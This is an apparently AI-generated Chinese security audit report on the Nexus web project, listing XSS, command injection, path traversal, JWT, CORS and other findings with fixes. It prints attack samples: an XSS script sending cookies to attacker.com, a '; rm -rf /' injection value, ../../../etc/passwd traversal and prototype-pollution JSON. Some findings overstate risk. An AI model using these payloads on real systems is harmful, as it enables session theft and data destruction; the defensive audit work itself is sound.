# Nexus 安全漏洞审计报告

**审计日期**: 2026-03-02  
**审计人员**: AI Security Auditor  
**风险等级**: 🔴 高危

---

## 执行摘要

经过全面的安全审查，发现 **7个高危漏洞**、**5个中危漏洞** 和 **8个低危漏洞**。建议立即修复高危漏洞，特别是XSS和命令执行漏洞。

### 风险统计
| 等级 | 数量 | 状态 |
|------|------|------|
| 🔴 高危 | 7 | 需立即修复 |
| 🟡 中危 | 5 | 建议尽快修复 |
| 🟢 低危 | 8 | 建议后续修复 |

---

## 🔴 高危漏洞

### 1. XSS漏洞 - 存储型跨站脚本攻击

**位置**:
- `apps/manager/modules/plugins/components/NotesManager/index.tsx:445`
- `apps/manager/modules/notes/index.tsx:228, 756`
- `apps/frontend/plugins/builtin/notes/index.tsx:155, 873`
- `apps/manager/modules/settings/pages/SettingsPage.tsx:189`

**漏洞描述**:
`renderMarkdown` 函数没有对用户输入进行HTML转义，直接使用正则表达式替换后通过 `dangerouslySetInnerHTML` 渲染，攻击者可以注入恶意脚本。

**攻击向量**:
```markdown
# 正常标题

<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<img src=x onerror="alert('XSS')">

[点击我](javascript:alert('XSS'))
```

**影响**:
- 窃取用户Cookie和Session
- 以受害者身份执行操作
- 钓鱼攻击
- 键盘记录

**修复建议**:
```typescript
// 添加HTML转义函数
function escapeHtml(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function renderMarkdown(text: string): string {
  if (!text) return '';
  // 先转义HTML，再处理markdown
  const escaped = escapeHtml(text);
  return escaped
    .replace(/^### (.*$)/gim, '<h3 class="text-lg font-bold mt-3 mb-2">$1</h3>')
    // ... 其他替换
    // 移除危险标签
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/javascript:/gi, '');
}
```

**优先级**: P0 - 立即修复

---

### 2. 命令注入漏洞

**位置**:
- `apps/server/src/routes/v2/system.ts:113-116`

**漏洞代码**:
```typescript
const { execSync } = await import('child_process')
const result = execSync('docker ps -q 2>/dev/null | wc -l', { encoding: 'utf8', timeout: 1000 })
```

**漏洞描述**:
虽然当前代码中命令是硬编码的，但如果未来有用户输入拼接，将存在命令注入风险。此外，`execSync` 的使用本身就不安全。

**攻击向量** (如果用户输入被拼接):
```
userInput = "; rm -rf / #"
command = `docker ps -q ${userInput} | wc -l`
```

**修复建议**:
```typescript
// 使用 execFile 代替 execSync
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// 安全的命令执行
async function getDockerCount(): Promise<number> {
  try {
    const { stdout } = await execFileAsync('docker', ['ps', '-q'], {
      timeout: 1000,
      encoding: 'utf8'
    });
    return stdout.trim().split('\n').filter(Boolean).length;
  } catch {
    return 0;
  }
}
```

**优先级**: P1 - 尽快修复

---

### 3. 路径穿越漏洞 - 文件下载

**位置**:
- `apps/server/src/features/file-transfer/routes.ts:100-120`

**漏洞描述**:
虽然代码有路径检查，但使用 `path.resolve()` 在某些情况下仍可能被绕过。

**当前代码**:
```typescript
const filePath = path.resolve(uploadsDir, file.filePath)
if (!filePath.startsWith(uploadsDir)) {
  return res.status(403).json({ error: '非法文件路径' })
}
```

**绕过方式**:
```javascript
// 如果 file.filePath 包含符号链接或特殊字符
filePath = "/app/uploads/../../../etc/passwd"
// 在某些文件系统上可能绕过检查
```

**修复建议**:
```typescript
import { realpath } from 'fs/promises';

// 获取真实路径
const resolvedPath = await realpath(path.join(uploadsDir, file.filePath));
const resolvedUploadsDir = await realpath(uploadsDir);

if (!resolvedPath.startsWith(resolvedUploadsDir)) {
  return res.status(403).json({ error: '非法文件路径' });
}
```

**优先级**: P1 - 尽快修复

---

### 4. JWT密钥硬编码/弱密钥

**位置**:
- `apps/server/src/middleware/auth.ts:12-15`

**漏洞代码**:
```typescript
const JWT_SECRET = process.env.JWT_SECRET || (process.env.NODE_ENV === 'production' 
  ? (() => { throw new Error('JWT_SECRET must be set in production environment') })()
  : 'dev-jwt-secret-not-for-production-' + Date.now())
```

**漏洞描述**:
虽然生产环境会抛出错误，但如果环境变量未设置，开发环境的密钥是可预测的（基于时间戳）。

**风险**:
- 如果生产环境配置错误，使用弱密钥
- 攻击者可以伪造JWT Token

**修复建议**:
```typescript
const JWT_SECRET = process.env.JWT_SECRET;

if (!JWT_SECRET) {
  if (process.env.NODE_ENV === 'production') {
    throw new Error('JWT_SECRET must be set in production environment');
  }
  // 开发环境生成随机密钥
  JWT_SECRET = crypto.randomBytes(64).toString('hex');
  console.warn('[Security] Generated random JWT_SECRET for development');
}

// 检查密钥强度
if (JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters long');
}
```

**优先级**: P1 - 尽快修复

---

### 5. 不安全的反序列化

**位置**:
- `apps/server/src/db/settings.ts:1004`
- `apps/server/src/routes/v2/settings.ts:65`

**漏洞描述**:
多处使用 `JSON.parse()` 解析用户输入的数据，没有进行验证。

**攻击向量**:
```json
{
  "__proto__": {"isAdmin": true},
  "constructor": {"prototype": {"isAdmin": true}}
}
```

**修复建议**:
```typescript
import { z } from 'zod';

// 使用 Zod 验证输入
const SettingsSchema = z.object({
  siteName: z.string().max(100).optional(),
  theme: z.enum(['light', 'dark', 'auto']).optional(),
  // ... 其他字段
});

function parseSettings(data: string): Settings {
  const parsed = JSON.parse(data);
  return SettingsSchema.parse(parsed); // 验证并过滤
}
```

**优先级**: P2 - 建议修复

---

### 6. 敏感信息泄露

**位置**:
- `apps/server/src/routes/v2/system.ts:35-50`

**漏洞描述**:
系统信息接口返回过多敏感信息，包括Node版本、平台、内存使用情况等。

**当前代码**:
```typescript
res.json({
  data: {
    nodeVersion: process.version,
    platform: process.platform,
    dbVersion: dbInfo?.version,
    uptime: process.uptime(),
    memory: process.memoryUsage(),  // 敏感信息
  }
})
```

**风险**:
- 攻击者可利用版本信息进行针对性攻击
- 内存信息可能泄露敏感数据

**修复建议**:
```typescript
res.json({
  data: {
    status: 'running',
    version: '2.0.0', // 只返回必要信息
    timestamp: new Date().toISOString(),
  }
})
```

**优先级**: P2 - 建议修复

---

### 7. 缺乏速率限制

**位置**:
- 多处API接口

**漏洞描述**:
许多接口没有速率限制，容易受到暴力破解和DDoS攻击。

**受影响的接口**:
- `/api/v2/auth/login` - 暴力破解
- `/api/v2/users/register` - 批量注册
- `/api/file-transfers/download/:token` - 资源耗尽
- `/api/v2/bookmarks` - 数据爬取

**修复建议**:
```typescript
import rateLimit from 'express-rate-limit';

// 登录限制
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 5, // 最多5次
  message: { error: '请求过于频繁，请稍后再试' },
  standardHeaders: true,
  legacyHeaders: false,
});

router.post('/login', loginLimiter, async (req, res) => {
  // ...
});
```

**优先级**: P1 - 尽快修复

---

## 🟡 中危漏洞

### 8. CORS配置过于宽松

**位置**:
- `apps/server/src/index.ts`

**风险**: 如果配置了 `Access-Control-Allow-Origin: *`，可能导致CSRF攻击。

**修复**:
```typescript
const corsOptions = {
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:5173'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
};
```

---

### 9. 不安全的Cookie配置

**位置**:
- `apps/server/src/middleware/sessionAuth.ts`

**风险**: Cookie可能缺少 `secure`、`httpOnly`、`sameSite` 属性。

**修复**:
```typescript
res.cookie('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 24 * 60 * 60 * 1000,
});
```

---

### 10. SQL注入风险（潜在）

**位置**:
- `apps/server/src/db/init.ts:2557`

**风险**: 动态SQL拼接，虽然使用了参数化查询，但IN子句的动态构建有风险。

```typescript
const existingPresets = db.exec(
  `SELECT id FROM bookmark_card_styles WHERE id IN (${presetIds.map(() => '?').join(',')})`, 
  presetIds
);
```

---

### 11. 缺乏输入验证

**位置**:
- 多个路由文件

**风险**: 许多API端点缺乏输入验证，可能导致各种注入攻击。

**修复**: 使用 Zod 或 Joi 进行统一的输入验证。

---

### 12. 日志注入

**位置**:
- 多处日志记录

**风险**: 用户输入直接写入日志，可能导致日志注入攻击。

```typescript
// 危险
console.log(`User ${username} logged in`);

// 安全
console.log('User logged in', { username: sanitizeLog(username) });
```

---

## 🟢 低危漏洞

### 13. 信息泄露 - 错误详情

**位置**: 多处错误处理

**风险**: 错误信息可能泄露系统内部结构。

**修复**:
```typescript
// 生产环境不返回详细错误
if (process.env.NODE_ENV === 'production') {
  res.status(500).json({ error: 'Internal Server Error' });
} else {
  res.status(500).json({ error: error.message, stack: error.stack });
}
```

### 14. 缺乏安全响应头

**风险**: 缺少 CSP、HSTS 等安全响应头。

**修复**:
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // 尽量避免 unsafe-inline
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
}));
```

### 15. 会话固定攻击

**风险**: 登录后没有重新生成Session ID。

### 16. 缺乏密码复杂度要求

**风险**: 密码策略过于宽松。

### 17. 不安全的随机数

**位置**: 多处使用 `Math.random()` 生成Token

**风险**: `Math.random()` 不是加密安全的。

**修复**:
```typescript
import { randomBytes } from 'crypto';

const token = randomBytes(32).toString('hex');
```

### 18. 文件上传目录可执行

**风险**: 上传目录可能有执行权限。

### 19. 缺乏审计日志

**风险**: 关键操作缺乏审计记录。

### 20. 硬编码敏感信息

**风险**: 代码中可能存在硬编码的密钥或密码。

---

## 修复优先级建议

### 立即修复（1-3天）
1. XSS漏洞 - 所有 `dangerouslySetInnerHTML` 位置
2. 命令注入 - `system.ts` 中的 `execSync`
3. 路径穿越 - 文件下载验证

### 尽快修复（1周内）
4. JWT密钥安全
5. 速率限制
6. CORS配置
7. Cookie安全

### 后续修复（1个月内）
8. 输入验证
9. 安全响应头
10. 敏感信息泄露
11. 审计日志

---

## 安全测试建议

### 自动化测试
```bash
# 依赖漏洞扫描
npm audit

# SAST扫描
npm install -g semgrep
semgrep --config=auto .

# 容器扫描
docker scan nexus-server
```

### 手动测试
1. XSS测试 - 在所有输入框尝试 `<script>alert(1)</script>`
2. 路径穿越 - 尝试 `../../../etc/passwd`
3. SQL注入 - 尝试 `' OR '1'='1`
4. 认证绕过 - 尝试修改JWT Token

---

## 结论

Nexus项目存在多个高危安全漏洞，特别是XSS和命令执行漏洞需要立即修复。建议：

1. **立即**修复所有P0和P1级别漏洞
2. 建立安全开发生命周期（SDL）
3. 定期进行安全审计
4. 实施自动化安全扫描
5. 对开发团队进行安全培训

---

**报告生成时间**: 2026-03-02  
**下次审计建议**: 修复完成后1个月内
